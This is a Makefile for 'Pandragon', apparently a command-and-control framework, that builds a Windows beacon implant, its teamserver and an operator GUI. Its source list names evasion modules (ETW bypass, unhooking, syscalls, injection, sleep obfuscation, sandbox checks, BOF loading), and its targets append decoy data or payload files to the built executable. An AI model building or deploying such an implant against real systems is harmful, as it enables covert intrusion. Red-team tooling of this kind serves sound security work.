# Pandragon Makefile

CXX = clang++
TARGET = x86_64-w64-windows-gnu
OUTPUT_DIR = build/beacon
OUTPUT = $(OUTPUT_DIR)/pandragon.exe

# Config builder
PYTHON = python3
CONFIG_BUILDER = tools/config_builder.py
APPEND_TOOL = tools/append_data.py
CONFIG_FILE ?= Beacon/config/default.json
CONFIG_OUTPUT_DIR = Beacon/config
GENERATED_CONFIG = Beacon/include/generated_config.h

# required for all builds. todo add as input?
KEY_FILE = server/known_beacons.json

# VERBOSE=1
VERBOSE ?= 0
ifeq ($(VERBOSE),1)
    Q =
    ECHO = @true
    CXXFLAGS += -DVERBOSE
else
    Q = @
    ECHO = @echo
endif

BUILD_SEED := $(shell python3 -c "import secrets; print(hex(secrets.randbits(64)))")

CXXFLAGS = -target $(TARGET) -nostdlib -nostartfiles -Oz -std=c++20 \
           -maes -fno-builtin -fno-threadsafe-statics -fno-exceptions \
           -Wall -flto=full -MD -MP -ffunction-sections -fdata-sections \
           -fvisibility=hidden -Wl,--build-id=none \
           -fno-unwind-tables -fno-asynchronous-unwind-tables \
           -I$(OUTPUT_DIR)/.. -I. -Iinclude -IBeacon/include \
           -DBUILD_TIME_RANDOM_SEED=$(BUILD_SEED)

LDFLAGS = -fuse-ld=lld \
          -Wl,--entry=__start \
          -Wl,--gc-sections \
          -Wl,-s \
          #-Wl,--no-seh \
          -Wl,--no-dynamicbase \
          -Wl,--subsystem,windows # im pretty sure this causes an issue if you try to open a BOF that launches a graphical app.
                                    # something something window handle inheritance.


SOURCES = Beacon/core/main.cpp \
          Beacon/core/handlers.cpp \
          Beacon/core/pandragon_runtime.cpp \
          Beacon/core/resolver.cpp \
          Beacon/core/syscalls.cpp \
          Beacon/core/utils.cpp \
          Beacon/core/etw_bypass.cpp \
          Beacon/core/config_parser.cpp \
          Beacon/core/injection.cpp \
          Beacon/core/unhook.cpp \
          Beacon/core/sleep_obf.cpp \
          Beacon/libs/managers.cpp \
          Beacon/libs/network/winhttp.cpp \
          Beacon/libs/network/tcp_socket.cpp \
          Beacon/libs/network/pipe_transport.cpp \
          Beacon/libs/network/transport.cpp \
          Beacon/core/coff/beacon_compatibility.cpp \
          Beacon/core/coff/coff_loader.cpp \
          Beacon/core/coff/bof_runner.cpp \
          Beacon/core/coff/async_bof_manager.cpp \
          Beacon/core/coff/bof_cache.cpp \
          Beacon/core/sandbox.cpp \
          Beacon/core/coff/beacon_api_resolver.cpp \
          Beacon/libs/bastia/bastia.cpp \
          Beacon/libs/network/net_abstract.cpp

# Object files (in build directory)
OBJECTS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.o)

# Dependency files
DEPS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.d)

-include $(DEPS)

# Conditional DEBUG flag
ifeq ($(DEBUG),1)
    CXXFLAGS += -DDEBUG
    OUTPUT = $(OUTPUT_DIR)/pandragon_debug.exe
else
    # subsystem already set in base LDFLAGS
endif

.PHONY: all clean clean-logs clean-all config rebuild keys sync-keys check-keys \
        server server-test server-clean run-server run-server-args run-gui gui-clean \
        venv build-parser venv-build setup clean-venv help-setup submodules \
        append-data append-file append-hex append-chain append-config \
        config-all config-check config-graph

# Default target: check keys, generate config, then build
all: check-keys config $(OUTPUT) append-config
	$(ECHO) "[+] Build complete: $(OUTPUT)"

# Check if key file exists, fail if not
check-keys:
	@if [ ! -f "$(KEY_FILE)" ]; then \
		echo "[!] ERROR: $(KEY_FILE) not found!"; \
		echo "[!] Run 'make keys' first to generate crypto keys."; \
		exit 1; \
	fi
	$(ECHO) "[*] Found key file: $(KEY_FILE)"

# Generate random crypto key if not exists
keys: $(KEY_FILE)

$(KEY_FILE):
	$(ECHO) "[*] Generating random crypto key..."
	@$(PYTHON) -c "import json, os, hashlib; \
key = os.urandom(32); \
beacon_id = hashlib.sha256(key).hexdigest()[:16]; \
data = {'version': 2, 'beacons': {beacon_id: {'crypto_key': key.hex(), 'allowed_routes': []}}}; \
json.dump(data, open('$(KEY_FILE)', 'w'), indent=2); \
print('[+] Generated beacon ID:', beacon_id); \
print('[+] Key saved to:', '$(KEY_FILE)')"

# Sync beacon keys to server directory
sync-keys: keys
	$(ECHO) "[*] Verifying beacon keys..."
	@test -f $(KEY_FILE)
	$(ECHO) "[+] Beacon keys ready: $(KEY_FILE)"

# Generate config from JSON (always regenerate)
.PHONY: config
config:
	$(ECHO) "[*] Generating config from $(CONFIG_FILE)..."
	$(Q)$(PYTHON) $(CONFIG_BUILDER) $(CONFIG_FILE) $(CONFIG_OUTPUT_DIR)

# Force config regeneration (same as config since it always regenerates)
.PHONY: force-config
force-config: config

# =============================================================================
# Unified config targets (Options 2+3: Config Graph + Make UX)
# =============================================================================

# One-command config setup: keys + beacon config + SSL cert
.PHONY: config-all
config-all: check-keys config
	$(MAKE) -C server ssl-cert
	$(ECHO) "[+] All config artifacts ready"

# Validate the entire config stack
.PHONY: config-check
config-check:
	$(Q)$(PYTHON) tools/config_check.py --check-all

# Print the config flow graph
.PHONY: config-graph
config-graph:
	$(Q)$(PYTHON) tools/config_check.py --graph

# =============================================================================
# Post-build append targets (Cobalt Strike-style prepend/append)
# =============================================================================

# Append string data to beacon exe
# Usage: make append-data DATA="DECOY_STRING"
.PHONY: append-data
append-data: $(OUTPUT)
	@if [ -z "$(DATA)" ]; then \
		echo "[!] Usage: make append-data DATA=\"your_string\""; \
		exit 1; \
	fi
	$(ECHO) "[*] Appending string data to $(OUTPUT)..."
	$(Q)$(PYTHON) $(APPEND_TOOL) $(OUTPUT) --data "$(DATA)"

# Append binary file to beacon exe
# Usage: make append-file FILE=payload.bin
.PHONY: append-file
append-file: $(OUTPUT)
	@if [ -z "$(FILE)" ]; then \
		echo "[!] Usage: make append-file FILE=payload.bin"; \
		exit 1; \
	fi
	$(ECHO) "[*] Appending file $(FILE) to $(OUTPUT)..."
	$(Q)$(PYTHON) $(APPEND_TOOL) $(OUTPUT) --file "$(FILE)"

# Append hex data to beacon exe
# Usage: make append-hex HEX="deadbeefcafe"
.PHONY: append-hex
append-hex: $(OUTPUT)
	@if [ -z "$(HEX)" ]; then \
		echo "[!] Usage: make append-hex HEX=\"deadbeefcafe\""; \
		exit 1; \
	fi
	$(ECHO) "[*] Appending hex data to $(OUTPUT)..."
	$(Q)$(PYTHON) $(APPEND_TOOL) $(OUTPUT) --hex "$(HEX)"

# Chain multiple appends (string + file + hex)
# Usage: make append-chain DATA="str1" FILE=payload.bin HEX="deadbeef"
.PHONY: append-chain
append-chain: $(OUTPUT)
	@if [ -z "$(DATA)" ] && [ -z "$(FILE)" ] && [ -z "$(HEX)" ]; then \
		echo "[!] Usage: make append-chain [DATA=\"str\"] [FILE=file.bin] [HEX=\"hex\"]"; \
		exit 1; \
	fi
	$(ECHO) "[*] Appending chained data to $(OUTPUT)..."
	$(Q)$(PYTHON) $(APPEND_TOOL) $(OUTPUT) $(if $(DATA),--data "$(DATA)") $(if $(FILE),--file "$(FILE)") $(if $(HEX),--hex "$(HEX)")

# Auto-append post-build strings from config (if post_build.append is defined)
# Runs automatically after build if Beacon/config/default_append.bin exists
.PHONY: append-config
append-config: $(OUTPUT)
	@CONFIG_NAME=$$(basename $(CONFIG_FILE) .json); \
	APPEND_FILE=Beacon/config/$${CONFIG_NAME}_append.bin; \
	if [ -f "$$APPEND_FILE" ]; then \
		echo "[*] Auto-appending post-build config data from $$APPEND_FILE..."; \
		$(PYTHON) $(APPEND_TOOL) $(OUTPUT) --file "$$APPEND_FILE"; \
	else \
		echo "[*] No post-build append data found (skipping)"; \
	fi
$(OUTPUT): $(OBJECTS)
	$(CXX) $(CXXFLAGS) $(LDFLAGS) $^ -o $@

# Compile source files (depend on generated config)
$(OUTPUT_DIR)/%.o: %.cpp $(GENERATED_CONFIG)
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) -c $< -o $@

clean:
	rm -rf $(OUTPUT_DIR)
	rm -f $(GENERATED_CONFIG)
	rm -f Beacon/config/*.bin Beacon/config/include/generated_config.h Beacon/include/generated_config.h
	# NOTE: Do NOT delete $(KEY_FILE) - keys are persistent credentials

# Remove server logs, sessions, and runtime data (preserves keys & config)
clean-logs:
	$(MAKE) -C server clean-logs

# Clean everything: build artifacts, logs, generated files, Python cache
clean-all: clean clean-logs
	$(MAKE) -C server clean
	find . -type d -name '__pycache__' -exec rm -rf {} + 2>/dev/null || true
	find . -type d -name '.pytest_cache' -exec rm -rf {} + 2>/dev/null || true
	find . -type f -name '*.pyc' -delete 2>/dev/null || true
	rm -f include/generated_config.h Beacon/include/generated_config.h
	rm -f server/known_beacons.json
	$(ECHO) "[+] Full clean complete"

rebuild: clean all

# =============================================================================
# Setup & Configuration
# =============================================================================

# Generate self-signed SSL cert if missing
.PHONY: ssl-cert
ssl-cert:
	$(MAKE) -C server ssl-cert

# Initialize submodules (no-op until Phase 4)
.PHONY: submodules
submodules:
	@git submodule update --init --recursive 2>/dev/null || true

# Setup development environment (venv, deps, parser, SSL certs)
.PHONY: setup
setup:
	@echo "[*] Setting up server environment..."
	$(MAKE) -C server setup
	@echo "[*] Setting up GUI environment..."
	$(MAKE) -C gui setup
	$(ECHO) "[+] Development environment ready!"
	$(ECHO) "  Run server: make run-server"
	$(ECHO) "  Run server with args: make run-server-args ARGS=\"...\""
	$(ECHO) "  Run GUI: make run-gui"
	$(ECHO) "  Activate server venv: source server/venv/bin/activate"

# Create venv and install dependencies
.PHONY: venv
venv:
	$(MAKE) -C server venv

# Build the Cython parser (requires venv)
.PHONY: build-parser
build-parser: venv
	$(MAKE) -C server build-parser

# Combined: venv + parser build
.PHONY: venv-build
venv-build:
	$(MAKE) -C server venv-build

# Run server with venv activated
.PHONY: run-server
run-server:
	$(MAKE) -C server run

# Run server with args (e.g., make run-server-args ARGS="--debug")
.PHONY: run-server-args
run-server-args:
	$(MAKE) -C server run-args ARGS="$(ARGS)"

# Run operator GUI (GUI deps merged into server/requirements.txt)
.PHONY: run-gui
run-gui:
	$(MAKE) -C gui run

# Remove GUI runtime artifacts
.PHONY: gui-clean
gui-clean:
	$(MAKE) -C gui clean

# Clean server venv and build artifacts
.PHONY: clean-venv
clean-venv:
	$(MAKE) -C server clean-venv

# Print setup help
.PHONY: help-setup
help-setup:
	@echo "Pandragon Setup Commands:"
	@echo "  make setup          - Full setup: server venv + GUI venv + parser + SSL cert"
	@echo "  make run-server     - Build parser if needed, run teamserver"
	@echo "  make run-server-args ARGS='...' - Run with custom args"
	@echo "  make run-gui        - Launch operator GUI"
	@echo "  make build-parser   - Build Cython parser only"
	@echo "  make venv           - Create venv and install deps only"
	@echo "  make clean-venv     - Remove venv and parser build artifacts"
	@echo ""
	@echo "Submodule targets (delegated):"
	@echo "  make -C server <target>  - Server-specific (see server/Makefile)"
	@echo "  make -C gui <target>     - GUI-specific (see gui/Makefile)"

# Build standalone server binary (delegated to server/Makefile)
server:
	$(MAKE) -C server build

# Run server tests (delegated to server/Makefile)
server-test:
	$(MAKE) -C server test

# Remove PyInstaller build artifacts and parser build products
.PHONY: server-clean
server-clean:
	$(MAKE) -C server clean
